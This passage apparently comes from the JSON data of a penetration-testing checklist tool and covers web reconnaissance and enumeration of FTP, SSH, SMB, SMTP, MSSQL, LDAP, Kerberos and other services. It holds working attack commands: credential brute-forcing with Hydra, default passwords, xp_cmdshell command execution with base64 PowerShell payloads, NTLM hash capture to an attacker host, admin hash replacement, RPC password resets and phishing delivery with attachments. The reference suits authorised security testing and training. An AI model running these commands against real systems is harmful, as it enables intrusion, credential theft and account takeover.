                "subdesc": "Discover hidden paths, admin panels, and API endpoints from robots.txt and sitemaps.",
                "cmd": [
                  "curl -s target.com/robots.txt",
                  "curl -s target.com/sitemap.xml",
                  "curl -s target.com/sitemap_index.xml",
                  "curl -s target.com/.well-known/security.txt"
                ]
              }
            ]
          },
          {
            "desc": "JavaScript File Analysis",
            "entries": [
              {
                "subdesc": "Extract JS file URLs",
                "cmd": [
                  "curl -s target.com | grep -oP 'src=\"[^\"]*\\.js\"' | sed 's/src=\"//;s/\"//'"
                ]
              },
              {
                "subdesc": "Analyze JS for endpoints and secrets",
                "cmd": [
                  "linkfinder -i https://target.com -o cli"
                ]
              },
              {
                "subdesc": "Search JS files for secrets",
                "cmd": [
                  "curl -s target.com/app.js | grep -Ei 'api_key|secret|password|token|endpoint|internal'"
                ]
              }
            ]
          }
        ]
      }
    ]
  },

  /* ─── Phase 2: Enumeration / Recon ────────────────────── */
  {
    "id": "recon",
    "name": "Enumeration",
    "optional": false,
    "items": [
      {
        "id": "recon-1",
        "name": "Host Discovery / Ping Sweep",
        "description": "Identify live hosts on the network before diving into port scans. Use ARP for local subnets, ICMP/TCP for remote ranges.",
        "commands": [
          {
            "desc": "ARP scan (local subnet only)",
            "entries": [
              {
                "subdesc": "Fastest and most reliable on a local LAN — cannot be blocked by host firewalls",
                "cmd": [
                  "sudo arp-scan -l",
                  "nmap -sn -PR <SUBNET>"
                ]
              }
            ]
          },
          {
            "desc": "ICMP / TCP ping sweep",
            "entries": [
              {
                "subdesc": "Use -sn for host discovery only (no port scan). Add -PE for ICMP echo, -PS for TCP SYN, -PA for TCP ACK",
                "cmd": [
                  "nmap -sn <SUBNET>",
                  "nmap -sn -PE -PS21,22,25,80,443,445,3389 <SUBNET>"
                ]
              }
            ]
          },
          {
            "desc": "Netdiscover (passive/active ARP)",
            "entries": [
              {
                "subdesc": "Passive mode (-p) listens without sending packets — useful for stealth",
                "cmd": [
                  "netdiscover -r <SUBNET>",
                  "netdiscover -p -r <SUBNET>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-2",
        "name": "TCP Port Scan (Full)",
        "description": "Full TCP port coverage with OS detection and aggressive scan settings.",
        "commands": [
          {
            "desc": "Full TCP scan with OS and version detection at high speed",
            "entries": [
              {
                "subdesc": "Comprehensive scan combining OS detection (-O), default scripts (-sC), version detection (-sV), and aggressive mode (-A)",
                "cmd": [
                  "nmap -p- -O -sC -sV -A --min-rate 5000 <TARGET_IP>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-3",
        "name": "UDP Port Scan",
        "description": "Scan the most common UDP services for exposure.",
        "commands": [
          {
            "desc": "Scan top 100 UDP ports",
            "entries": [
              {
                "subdesc": "UDP scans are slow — focus on top ports for DNS (53), SNMP (161), TFTP (69), NTP (123)",
                "cmd": [
                  "nmap -sU --top-ports 100 <TARGET_IP>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-4",
        "name": "FTP Enumeration (21)",
        "description": "Check for anonymous access, grab files, and bruteforce credentials.",
        "commands": [
          {
            "desc": "Attempt anonymous FTP login (use \"passive\" if 229 error)",
            "entries": [
              {
                "subdesc": "Check for misconfigured anonymous access — common on older systems",
                "cmd": [
                  "ftp anonymous@<TARGET_IP>"
                ]
              }
            ]
          },
          {
            "desc": "Grab all files from an anonymous share",
            "entries": [
              {
                "subdesc": "Switch to binary mode and disable prompts for bulk file download",
                "cmd": [
                  "binary",
                  "PROMPT OFF",
                  "mget *"
                ]
              }
            ]
          },
          {
            "desc": "Bruteforce FTP credentials with Hydra",
            "entries": [
              {
                "subdesc": "-s <port-num> specify non-default port | -f exit after first valid login | -u try each username with all passwords before moving on",
                "cmd": [
                  "hydra -v -L users.txt -P /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://<TARGET_IP> -t 4"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-5",
        "name": "SSH Enumeration (22)",
        "description": "Audit SSH config, grab banners, and bruteforce credentials.",
        "commands": [
          {
            "desc": "Audit SSH server configuration and supported ciphers",
            "entries": [
              {
                "subdesc": "Checks for weak algorithms, outdated versions, and known vulnerable configurations",
                "cmd": [
                  "ssh-audit <TARGET_IP>"
                ]
              }
            ]
          },
          {
            "desc": "Grab SSH banner using legacy key exchange",
            "entries": [
              {
                "subdesc": "Use legacy key exchange to connect to older SSH servers that reject modern ciphers",
                "cmd": [
                  "ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 <TARGET_IP>"
                ]
              }
            ]
          },
          {
            "desc": "Bruteforce SSH credentials with Hydra",
            "entries": [
              {
                "subdesc": "-f exit after first valid login | -u try each username with all passwords before moving on",
                "cmd": [
                  "hydra -L users.txt -P passwords.txt -t 6 -vV ssh://<TARGET_IP>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-6",
        "name": "SMTP Enumeration (25/465/587)",
        "description": "Enumerate mail users, verify addresses manually, and send phishing test emails.",
        "commands": [
          {
            "desc": "Enumerate SMTP users with nmap script",
            "entries": [
              {
                "subdesc": "SMTP user enumeration via NSE scripts — discovers valid mailboxes",
                "cmd": [
                  "nmap -p 25 --script=smtp-enum-users <TARGET_IP>"
                ]
              }
            ]
          },
          {
            "desc": "Manually verify an email address via VRFY",
            "entries": [
              {
                "subdesc": "VRFY command confirms if a mailbox exists on the server — manual enumeration",
                "cmd": [
                  "nc -nv <TARGET_IP> 25",
                  "VRFY <username>"
                ]
              }
            ]
          },
          {
            "desc": "Send a phishing test email with attachment (SWAKS)",
            "entries": [
              {
                "subdesc": "SWAKS = Swiss Army Knife for SMTP — craft and send test emails with attachments",
                "cmd": [
                  "swaks --to receiver@mail.com --from sender@mail.com --auth LOGIN --auth-user sender@mail.com --header-X-Test \"Header\" --server <TARGET_IP> --attach file.txt"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-7",
        "name": "DNS Enumeration (53)",
        "description": "Banner grabbing, DNS enumeration, zone transfer testing, and subdomain discovery.",
        "commands": [
          {
            "desc": "Banner grabbing and DNS version info",
            "entries": [
              {
                "subdesc": "Identify DNS software and version for vulnerability research",
                "cmd": [
                  "dig @<TARGET_IP> version.bind CHAOS TXT",
                  "nmap -sV --script dns-nsid -p53 -Pn <TARGET_IP>"
                ]
              }
            ]
          },
          {
            "desc": "DNS record enumeration (whois, host, dig)",
            "entries": [
              {
                "subdesc": "Query core DNS records to map domain infrastructure",
                "cmd": [
                  "whois <DOMAIN>",
                  "host <DOMAIN> <TARGET_IP>",
                  "host -l <DOMAIN> <TARGET_IP>",
                  "dig @<TARGET_IP> -x <TARGET_IP>",
                  "dig @<TARGET_IP> <DOMAIN> ANY"
                ]
              }
            ]
          },
          {
            "desc": "Zone transfer test",
            "entries": [
              {
                "subdesc": "If nmap shows a TLS certificate commonName (e.g. mysite.test) and DNS is open, test for zone transfer. A successful transfer can reveal additional server hostnames to enumerate.",
                "cmd": [
                  "host -T -l <DOMAIN> <TARGET_IP>",
                  "dig @<TARGET_IP> <DOMAIN> AXFR",
                  "dnsrecon -d <DOMAIN> -a"
                ]
              }
            ]
          },
          {
            "desc": "DNS configuration files (Linux)",
            "entries": [
              {
                "subdesc": "Check these files on a compromised Linux host for DNS resolver and zone configuration.",
                "cmd": [
                  "host.conf",
                  "resolv.conf",
                  "named.conf"
                ]
              }
            ]
          },
          {
            "desc": "Subdomain enumeration (gobuster and ffuf)",
            "entries": [
              {
                "subdesc": "Active DNS brute-forcing through the target DNS server",
                "cmd": [
                  "gobuster dns -r <TARGET_IP> -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/namelist.txt -t 100",
                  "ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<RHOST>/ -H \"Host: FUZZ.<RHOST>\" -fs 185"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-8",
        "name": "HTTP Enumeration (80/443)",
        "description": "Web server fingerprinting, header inspection, technology enumeration, and default credential checks. Also manually review page source, robots.txt, sitemap.xml, and any login/upload portals.",
        "commands": [
          {
            "desc": "Fingerprint web server with nmap http-enum",
            "entries": [
              {
                "subdesc": "Discovers directories, default pages, and web server technology info",
                "cmd": [
                  "nmap -p 80 -sV --script=http-enum <TARGET_IP>"
                ]
              }
            ]
          },
          {
            "desc": "Grab HTTP headers and follow redirects",
            "entries": [
              {
                "subdesc": "Response headers reveal server software, redirects, and security policies",
                "cmd": [
                  "curl -IL http://<TARGET_IP>"
                ]
              }
            ]
          },
          {
            "desc": "Technology fingerprinting with WhatWeb",
            "entries": [
              {
                "subdesc": "Detect CMS, frameworks, server software, and CDN providers",
                "cmd": [
                  "whatweb -a 3 http://<TARGET_IP>",
                  "whatweb --no-errors <TARGET_SUBNET>/24"
                ]
              }
            ]
          },
          {
            "desc": "Default credentials to try on login portals",
            "entries": [
              {
                "subdesc": "Always check for common credentials or unchanged manufacturer defaults on any admin panel or login page.",
                "cmd": [
                  "admin:admin",
                  "administrator:administrator",
                  "admin@domain:admin",
                  "admin:password",
                  "administrator:password",
                  "guest:guest",
                  "root:",
                  "admin:password123"
                ]
              }
            ]
          },
          {
            "desc": "SSL/TLS certificate inspection",
            "entries": [
              {
                "subdesc": "Certificates can reveal email addresses, company names, and subdomains — useful for phishing or further enumeration.",
                "cmd": [
                  "openssl s_client -connect <TARGET_IP>:443"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-9",
        "name": "Directory Busting (HTTP)",
        "description": "Directory and file fuzzing on the web server.",
        "commands": [
          {
            "desc": "FEROXBUSTER",
            "entries": [
              {
                "subdesc": "Start with a basic directory scan, excluding certain HTTP error codes:",
                "cmd": [
                  "feroxbuster -u http://<TARGET-HOST> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 400,402,404,500,501,502,503,504,505"
                ]
              }
            ]
          },
          {
            "desc": "GOBUSTER",
            "entries": [
              {
                "subdesc": "Proceed with using raft-large-directories.txt dictionary:",
                "cmd": [
                  "gobuster dir -u http://<TARGET-HOST> -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -t 5 -b 404,501,502,503,504,505"
                ]
              }
            ]
          },
          {
            "desc": "FFUF",
            "entries": [
              {
                "subdesc": "Continue with raft dictionary, but this time with all relevant extensions:",
                "cmd": [
                  "ffuf -u http://<TARGET-IP>/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -e .php,.html,.asp,.aspx,.bak,.old,.orig,.tmp,.txt,.log,.env,.xml,.json,.yml,.conf,.ini,.zip,.tar,.gz,.rar,.md,.jsp,.sqp,.swo -r -t 100 -mc 200,301,302 -c\""
                ]
              }
            ]
          },
          {
            "desc": "DIRSEARCH",
            "entries": [
              {
                "subdesc": "Use common.txt dictionary:",
                "cmd": [
                  "dirsearch -u \"SITE-PATH\" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 50 --exclude-status 400,401,403,404,503"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-10",
        "name": "Nikto Scan (HTTP)",
        "description": "Web misconfiguration and vulnerability scan.",
        "commands": [
          {
            "desc": "Run a full Nikto scan and save output",
            "entries": [
              {
                "subdesc": "Checks for dangerous files, outdated software, misconfigurations, and known vulnerabilities",
                "cmd": [
                  "nikto -h http://<TARGET_IP> -o nikto_output.txt"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-11",
        "name": "SMB Enumeration (139/445)",
        "description": "Anonymous access, null sessions, share enumeration, SMB login with password/hash, and bruteforce.",
        "commands": [
          {
            "desc": "Anonymous and null session login attempts",
            "entries": [
              {
                "subdesc": "Try anonymous, null password, and no-pass variants to discover accessible shares.",
                "cmd": [
                  "smbclient -L //<TARGET_IP> -U anonymous",
                  "smbclient -N -L //<TARGET_IP>",
                  "smbclient --no-pass //<TARGET_IP>/anonymous",
                  "smbclient -N //<TARGET_IP>/<SHARE>"
                ]
              }
            ]
          },
          {
            "desc": "CrackMapExec enumeration (users, password policy, shares)",
            "entries": [
              {
                "subdesc": "Null session enumeration — RID brute-force finds users even when listing is disabled",
                "cmd": [
                  "crackmapexec smb <TARGET_IP> -u \"\" -p \"\" --users --rid-brute",
                  "crackmapexec smb <TARGET_IP> -u \"\" -p \"\" --pass-pol",
                  "crackmapexec smb <TARGET_IP> -u \"\" -p \"\" --shares",
                  "crackmapexec smb <TARGET_IP> -u \"\" -p \"\" --spider <SHARE> --regex ."
                ]
              }
            ]
          },
          {
            "desc": "Enum4Linux and nmap SMB scripts",
            "entries": [
              {
                "subdesc": "Full SMB enumeration — OS discovery, known vulnerabilities, and NetBIOS scanning",
                "cmd": [
                  "enum4linux -a <TARGET_IP>",
                  "nmap -v -p 139,445 --script smb-os-discovery <TARGET_IP>",
                  "nmap --script smb-vuln* -p 139,445 <TARGET_IP>",
                  "sudo nbtscan -r <TARGET_SUBNET>"
                ]
              }
            ]
          },
          {
            "desc": "Authenticated SMB login (password and NTLM hash)",
            "entries": [
              {
                "subdesc": "Inside smbclient: RECURSE ON / PROMPT OFF / mget * to grab all files recursively.",
                "cmd": [
                  "smbclient //<TARGET_IP>/SYSVOL -U <USER>",
                  "smbclient -p 445 //<TARGET_IP>/<SHARE> -U <USER> --password=<PASS>",
                  "smbclient -L //<TARGET_IP> -U <DOMAIN>/<USER> --pw-nt-hash <HASH>",
                  "pth-smbclient //<TARGET_IP>/<SHARE> -U '<DOMAIN>\\<USER>%<NTLM_HASH>'"
                ]
              }
            ]
          },
          {
            "desc": "Bruteforce SMB credentials with Hydra",
            "entries": [
              {
                "subdesc": "Use -t 1 for SMB to avoid account lockouts",
                "cmd": [
                  "hydra -L users.txt -P passwords.txt -t 1 -vV smb://<TARGET_IP>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-12",
        "name": "SNMP Enumeration (161)",
        "description": "Scan for SNMP, bruteforce community strings, and enumerate Windows users/processes/software via MIB OIDs.",
        "commands": [
          {
            "desc": "Scan subnet for open SNMP ports",
            "entries": [
              {
                "subdesc": "Discover hosts running SNMP — often left with default community strings",
                "cmd": [
                  "nmap -sU --open -p 161 <TARGET_SUBNET> -oG open-snmp.txt"
                ]
              }
            ]
          },
          {
            "desc": "Bruteforce SNMP community strings",
            "entries": [
              {
                "subdesc": "Try common strings like public, private, manager against discovered SNMP hosts",
                "cmd": [
                  "onesixtyone -c <COMMUNITY-STRINGS-LIST> -i <IP-RANGES>"
                ]
              }
            ]
          },
          {
            "desc": "SNMP walk with public community string",
            "entries": [
              {
                "subdesc": "Dump all SNMP MIB data — may reveal system info, processes, and network config",
                "cmd": [
                  "snmpwalk -c public -v1 -t 10 <TARGET_IP>"
                ]
              }
            ]
          },
          {
            "desc": "Enumerate Windows users, processes, software, and open ports via MIB OIDs",
            "entries": [
              {
                "subdesc": "Windows Users → .77.1.2.25 | Running Processes → .25.4.2.1.2 | Installed Software → .25.6.3.1.2 | TCP Listening Ports → .6.13.1.3",
                "cmd": [
                  "snmpwalk -c public -v1 <TARGET_IP> 1.3.6.1.4.1.77.1.2.25",
                  "snmpwalk -c public -v1 <TARGET_IP> 1.3.6.1.2.1.25.4.2.1.2",
                  "snmpwalk -c public -v1 <TARGET_IP> 1.3.6.1.2.1.25.6.3.1.2",
                  "snmpwalk -c public -v1 <TARGET_IP> 1.3.6.1.2.1.6.13.1.3"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-13",
        "name": "LDAP / Global Catalog Enumeration (389/636/3268/3269)",
        "description": "Anonymous and authenticated LDAP enumeration, record extraction, and domain component queries.",
        "commands": [
          {
            "desc": "Anonymous LDAP enumeration with auto-derived base DN",
            "entries": [
              {
                "subdesc": "Automatically derives base DN from domain name for anonymous LDAP queries",
                "cmd": [
                  "target_domain='domain.tld'",
                  "target_hostname=\"DC01.${target_domain}\"",
                  "domain_component=$(echo $target_domain | tr '.' '\\n' | xargs -I % echo \"DC=%\" | paste -sd, -)",
                  "ldapsearch -x -H ldap://$target_hostname -b $domain_component"
                ]
              }
            ]
          },
          {
            "desc": "Alternative anonymous LDAP queries",
            "entries": [
              {
                "subdesc": "Query naming contexts first, then enumerate all objects under the base DN",
                "cmd": [
                  "ldapsearch -x -h <TARGET_IP> -s base namingcontexts",
                  "ldapsearch -x -h <TARGET_IP> -s sub -b 'DC=domain,DC=tld'"
                ]
              }
            ]
          },
          {
            "desc": "Authenticated LDAP search and full object dump",
            "entries": [
              {
                "subdesc": "With valid creds — dump sAMAccountNames or all objects for offline analysis",
                "cmd": [
                  "ldapsearch -x -H ldap://<TARGET_IP> -D '<DOMAIN>\\<USER>' -w '<PASS>' -b 'DC=domain,DC=tld' sAMAccountName",
                  "ldapsearch -x -H ldap://<TARGET_IP> -b $domain_component 'objectClass=*'"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-14",
        "name": "MSSQL Enumeration (1433)",
        "description": "MSSQL nmap scripts, impacket client, database queries, xp_cmdshell RCE, and xp_dirtree NTLM capture.",
        "commands": [
          {
            "desc": "MSSQL enumeration using nmap scripts",
            "entries": [
              {
                "subdesc": "Comprehensive NSE scan — checks empty passwords, xp_cmdshell, NTLM info, and hash dumping",
                "cmd": [
                  "nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <TARGET_IP>"
                ]
              }
            ]
          },
          {
            "desc": "Connect with impacket MSSQL client",
            "entries": [
              {
                "subdesc": "Interactive MSSQL client — supports Windows auth and domain credentials",
                "cmd": [
                  "impacket-mssqlclient Administrator:Pass@<TARGET_IP> -windows-auth",
                  "impacket-mssqlclient <DOMAIN>/<USER>:<PASS>@<TARGET_IP>"
                ]
              }
            ]
          },
          {
            "desc": "Basic database queries",
            "entries": [
              {
                "subdesc": "Enumerate version, databases, tables, and data after connecting",
                "cmd": [
                  "SELECT name from sys.databases;",
                  "USE <database-name>;",
                  "SELECT * FROM <database>.INFORMATION_SCHEMA.TABLES;",
                  "SELECT * FROM <database>.dbo.<table>;"
                ]
              }
            ]
          },
          {
            "desc": "Enable and use xp_cmdshell for OS command execution",
            "entries": [
              {
                "subdesc": "If the command is too long for xp_cmdshell, use the mssql-command-tool to execute directly.",
                "cmd": [
                  "enable_xp_cmdshell",
                  "EXEC sp_configure 'show advanced options', 1;",
                  "RECONFIGURE;",
                  "EXEC sp_configure 'xp_cmdshell', 1;",
                  "RECONFIGURE;",
                  "EXEC xp_cmdshell \"whoami\""
                ]
              }
            ]
          },
          {
            "desc": "Force NTLM authentication capture with xp_dirtree",
            "entries": [
              {
                "subdesc": "Use Responder or similar to capture the NTLM hash when the target connects to your share.",
                "cmd": [
                  "EXEC xp_dirtree '\\\\<LHOST>\\share'"
                ]
              }
            ]
          },
          {
            "desc": "MSSQL command tool (bypass xp_cmdshell length limits)",
            "entries": [
              {
                "subdesc": "Use when xp_cmdshell truncates long commands like base64-encoded PowerShell payloads.",
                "cmd": [
                  "./mssql-command-tools_Linux_amd64 --host <TARGET_IP> -u \"sa\" -p '<PASSWORD>' -c \"powershell -e <BASE64_PAYLOAD>\""
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-15",
        "name": "MySQL / MariaDB Enumeration (3306)",
        "description": "MySQL and MariaDB login, version check, database listing, data extraction, and credential replacement.",
        "commands": [
          {
            "desc": "Login to MySQL server",
            "entries": [
              {
                "subdesc": "Connect with credentials — use --skip-ssl-verify-server-cert for self-signed certs",
                "cmd": [
                  "mysql -u <username> -p <password> -h <TARGET_IP> -P 3306 --skip-ssl-verify-server-cert"
                ]
              }
            ]
          },
          {
            "desc": "Login to MariaDB server",
            "entries": [
              {
                "subdesc": "MariaDB uses the same SQL syntax as MySQL.",
                "cmd": [
                  "mariadb -h <TARGET_IP> -u <username> -p <password>"
                ]
              }
            ]
          },
          {
            "desc": "Check version, current user, list databases, and query tables",
            "entries": [
              {
                "subdesc": "Standard enumeration sequence after gaining database access",
                "cmd": [
                  "select version();",
                  "select system_user();",
                  "show databases;",
                  "use <database-name>;",
                  "select * from <table> \\G"
                ]
              }
            ]
          },
          {
            "desc": "Replace admin credentials in a table",
            "entries": [
              {
                "subdesc": "If you find a user table with hashed passwords, replace the admin hash with one you control.",
                "cmd": [
                  "UPDATE <table> SET password='<YOUR_HASH>' WHERE user_id='ADM';"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-15b",
        "name": "SQLite3 Enumeration (Local)",
        "description": "Enumerate local SQLite3 database files found on a compromised host.",
        "commands": [
          {
            "desc": "Open and query a SQLite3 database",
            "entries": [
              {
                "subdesc": "Common in web apps — look for .db, .sqlite, .sqlite3 files in /var/www, /opt, or application directories.",
                "cmd": [
                  "sqlite3 <database.db>",
                  ".databases",
                  ".tables",
                  "select * from <table>;",
                  ".quit"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-16",
        "name": "RDP Enumeration (3389)",
        "description": "RDP encryption enumeration and vulnerability checks (MS12-020).",
        "commands": [
          {
            "desc": "Enumerate RDP encryption, vulnerabilities, and NTLM info",
            "entries": [
              {
                "subdesc": "Check for MS12-020 (RCE), weak encryption, and leak NTLM domain info",
                "cmd": [
                  "nmap --script \"rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info\" -p 3389 -T4 <TARGET_IP>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-17",
        "name": "WinRM Check (5985/5986)",
        "description": "Validate WinRM access with known credentials.",
        "commands": [
          {
            "desc": "Connect to WinRM with evil-winrm",
            "entries": [
              {
                "subdesc": "Full interactive PowerShell shell — requires valid credentials and WinRM group membership",
                "cmd": [
                  "evil-winrm -i <TARGET_IP> -u <USER> -p <PASS>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-18",
        "name": "Finger Enumeration (79)",
        "description": "Enumerate users via Finger protocol using manual queries and automated scripts.",
        "commands": [
          {
            "desc": "Basic user enumeration via Finger",
            "entries": [
              {
                "subdesc": "Query for known usernames — blank query lists all logged-in users",
                "cmd": [
                  "finger @<TARGET_IP>",
                  "finger admin@<TARGET_IP>"
                ]
              }
            ]
          },
          {
            "desc": "Automated user enumeration with finger-user-enum.pl",
            "entries": [
              {
                "subdesc": "Brute-force valid usernames from a wordlist via Finger protocol",
                "cmd": [
                  "finger-user-enum.pl -U users.txt -t <TARGET_IP>",
                  "finger-user-enum.pl -u root -t <TARGET_IP>"
                ]
              }
            ]
          },
          {
            "desc": "Enumerate against a full wordlist and filter results",
            "entries": [
              {
                "subdesc": "Use a large names wordlist and grep for Login to filter valid accounts",
                "cmd": [
                  "perl finger-user-enum.pl -t <TARGET_IP> -U /usr/share/wordlists/seclists/Usernames/Names/names.txt | grep -win \"Login\""
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-19",
        "name": "Kerberos Enumeration (88)",
        "description": "Enumerate Kerberos users with nmap and kerbrute, and extract SPNs with credentials.",
        "commands": [
          {
            "desc": "Enumerate Kerberos users with nmap krb5-enum-users",
            "entries": [
              {
                "subdesc": "Enumerate valid domain usernames without credentials via Kerberos pre-auth responses",
                "cmd": [
                  "nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='domain.local',userdb=\"/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt\" <TARGET_IP>"
                ]
              }
            ]
          },
          {
            "desc": "Enumerate Kerberos users with Kerbrute",
            "entries": [
              {
                "subdesc": "Install: go install github.com/ropnop/kerbrute@latest — or download binary from https://github.com/ropnop/kerbrute/releases",
                "cmd": [
                  "./kerbrute userenum --dc <TARGET_IP> -d <DOMAIN> /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt"
                ]
              }
            ]
          },
          {
            "desc": "Extract SPNs (requires valid credentials)",
            "entries": [
              {
                "subdesc": "Request service tickets for cracking offline — Kerberoasting",
                "cmd": [
                  "GetUserSPNs.py -request -dc-ip <TARGET_IP> <DOMAIN>/<USER>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-20",
        "name": "MSRPC Enumeration (135)",
        "description": "MSRPC null auth, domain user/group enumeration, and RPC command reference.",
        "commands": [
          {
            "desc": "MSRPC enumeration with nmap and rpcclient null/empty auth",
            "entries": [
              {
                "subdesc": "Try both -N (null session) and -U ''%'' (empty user/pass) for anonymous access.",
                "cmd": [
                  "nmap -A -sV -sC -Pn --script=msrpc-enum <TARGET_IP> -p135",
                  "rpcclient <TARGET_IP> -N",
                  "rpcclient -U ''%'' <TARGET_IP>"
                ]
              }
            ]
          },
          {
            "desc": "Enumerate domain users and groups inside rpcclient",
            "entries": [
              {
                "subdesc": "querydispinfo shows user descriptions — may reveal cleartext passwords in comments.",
                "cmd": [
                  "enumdomusers",
                  "querydispinfo",
                  "queryuser <RID>",
                  "enumprinters",
                  "enumdomgroups",
                  "querygroup <RID>",
                  "querygroupmem <RID>"
                ]
              }
            ]
          },
          {
            "desc": "Extract domain users to a clean list",
            "entries": [
              {
                "subdesc": "Pipe enumdomusers output into a file and extract just the usernames.",
                "cmd": [
                  "cat rpcclient_output.txt | awk -F'\\[' '{print $2}' | awk -F'\\]' '{print $1}' > domain_users.txt"
                ]
              }
            ]
          },
          {
            "desc": "Change a user's password via RPC",
            "entries": [
              {
                "subdesc": "Useful if you have write access to a user object — level 23 sets the password directly.",
                "cmd": [
                  "setuserinfo2 <username> 23 <password>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-21",
        "name": "IMAP/IMAPS Enumeration (143/993)",
        "description": "IMAP NTLM enumeration, mailbox login, message retrieval, and phishing email delivery.",
        "commands": [
          {
            "desc": "Enumerate IMAP NTLM info with nmap",
            "entries": [
              {
                "subdesc": "Extract domain name and server info from IMAP NTLM authentication",
                "cmd": [
                  "nmap -p 143 --script imap-ntlm-info.nse <TARGET_IP>"
                ]
              }
            ]
          },
          {
            "desc": "Connect and interact with mailbox via IMAP commands",
            "entries": [
              {
                "subdesc": "After connecting with nc, run the following IMAP tag commands:",
                "cmd": [
                  "nc <TARGET_IP> 143",
                  "tag login USER@localhost PASSWORD",
                  "tag LIST \"\" \"*\"",
                  "tag SELECT INBOX",
                  "tag STATUS INBOX (MESSAGES)",
                  "tag fetch <num-of-messages> BODY[HEADER] BODY[1]"
                ]
              }
            ]
          },
          {
            "desc": "Deliver phishing email with attachment via SWAKS",
            "entries": [
              {
                "subdesc": "Deliver crafted phishing email with malicious attachment for initial access",
                "cmd": [
                  "swaks --to target@domain --from jonas@domain --attach @file.ods --server <TARGET_IP> --body \"Please check this out\" --header \"Subject: IMPORTANT UPDATE\""
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-22",
        "name": "POP3/POP3S Enumeration (110/995)",
        "description": "POP3 service and auth method checks.",
        "commands": [
          {
            "desc": "Enumerate POP3 capabilities and NTLM auth info",
            "entries": [
              {
                "subdesc": "Check POP3 service capabilities and extract NTLM domain information",
                "cmd": [
                  "nmap --script pop3-capabilities,pop3-ntlm-info -p110,995 <TARGET_IP>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-23",
        "name": "NFS / rpcbind Enumeration (111/2049)",
        "description": "Enumerate NFS exports and mount remote shares locally.",
        "commands": [
          {
            "desc": "List NFS exports on the target",
            "entries": [
              {
                "subdesc": "Check for world-readable exports — often expose sensitive files",
                "cmd": [
                  "showmount -e <TARGET_IP>"
                ]
              }
            ]
          },
          {
            "desc": "Mount the NFS share locally",
            "entries": [
              {
                "subdesc": "Mount remote NFS export and browse files directly on your system",
                "cmd": [
                  "mkdir nfstarget",
                  "sudo mount -t nfs <TARGET_IP>:/mnt/backups/ nfstarget -o nolock"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-24",
        "name": "PostgreSQL Enumeration (5432)",
        "description": "PostgreSQL login, database listing, table enumeration, and data extraction.",
        "commands": [
          {
            "desc": "Login to PostgreSQL server",
            "entries": [
              {
                "subdesc": "Connect with credentials — default user is often postgres",
                "cmd": [
                  "psql -h <TARGET_IP> -p 5432 -U <username>"
                ]
              }
            ]
          },
          {
            "desc": "List databases, connect, enumerate tables, and query data",
            "entries": [
              {
                "subdesc": "Standard PostgreSQL enumeration commands after connecting",
                "cmd": [
                  "\\x on",
                  "\\l;",
                  "\\c <database>;",
                  "\\dt;",
                  "SELECT * FROM \"TABLE-NAME\";"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-25",
        "name": "Oracle TNS Enumeration (1521)",
        "description": "Oracle listener version detection and SID discovery.",
        "commands": [
          {
            "desc": "Detect Oracle TNS listener version",
            "entries": [
              {
                "subdesc": "Identify Oracle database version and listener configuration",
                "cmd": [
                  "nmap --script oracle-tns-version -p1521 <TARGET_IP>"
                ]
              }
            ]
          },
          {
            "desc": "Guess Oracle SIDs with ODAT",
            "entries": [
              {
                "subdesc": "Brute-force Oracle SIDs — SID is required to connect to the database",
                "cmd": [
                  "odat sidguesser -s <TARGET_IP>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "recon-26",
        "name": "Redis Enumeration (6379)",
        "description": "Redis unauthenticated exposure and configuration checks.",
        "commands": [
          {
            "desc": "Retrieve Redis server info via CLI",
            "entries": [
              {
                "subdesc": "Check for unauthenticated access — Redis often runs with no password",
                "cmd": [
                  "redis-cli -h <TARGET_IP> -p 6379 INFO"
                ]
              }
            ]
          },
          {
            "desc": "Enumerate Redis with nmap info script",
            "entries": [
              {
                "subdesc": "Detect version and configuration details via NSE scripts",
                "cmd": [
                  "nmap --script redis-info -p6379 <TARGET_IP>"
                ]
              }
            ]
